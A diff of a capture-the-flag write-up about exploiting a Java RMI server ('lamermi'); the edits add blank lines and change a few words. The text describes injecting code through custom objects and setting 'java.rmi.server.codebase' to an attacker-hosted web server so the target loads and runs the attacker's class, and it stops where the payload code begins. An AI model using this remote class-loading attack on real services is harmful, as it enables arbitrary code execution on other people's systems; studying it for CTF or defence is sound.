@@ -16,8 +16,11 @@ Description:
 ## TL;DR
 
 - RMI server running on target
+
 - We can inject code by passing custom objects to the remote method
+
 - Due to a bad security manager we can access the file system
+
 - Flag is stored in file `flag`
 
 ## RMI
@@ -96,9 +99,9 @@ java.rmi.ServerException: RemoteException occurred in server thread; nested exce
 ```
 The server tries to load our class, but it doesn't know its class definition and fails.
 
-Googling this error eventually lead to a [StackOverflow answer](https://stackoverflow.com/a/20938326/6762008) which tells us that the client has to provide a `java.rmi.server.codebase` setting, so that the server knows where to load our classes from. For this we need an HTTP server facing the internet; I used some free webspace provider, uploaded `Payload0.class` to `http://some-webserver/rmi/it/polictf/lamermi/Payload0.class` and specified `-Djava.rmi.server.codebase=http://some-webserver/rmi/`. When we now run our client again, we get the expected `Result: 1.5`.
+Googling this error eventually lead to a [StackOverflow answer](https://stackoverflow.com/a/20938326/6762008) which tells us that the client has to provide a `java.rmi.server.codebase` setting, so that the server knows where to load our classes from. For this we need an HTTP server facing the internet; I used a free webspace provider, uploaded `Payload0.class` to `http://some-webserver/rmi/it/polictf/lamermi/Payload0.class` and specified `-Djava.rmi.server.codebase=http://some-webserver/rmi/`. When we now run our client again, we get the expected `Result: 1.5`.
 
-But there's still one thing missing until we are able to execute arbitrary code and return its result: we have to overwrite some method of `List<Integer>` which gets called inside `average()` with our payload code, and we need a way to return results back to our client.
+But there's still one thing missing until we are able to execute arbitrary code and return its result: we have to overwrite a method of `List<Integer>` which gets called inside `average()` with our payload code, and we need a way to return results back to our client.
 I used this payload to determine which methods are called inside `average()`:
 ```java
 package it.polictf.lamermi;
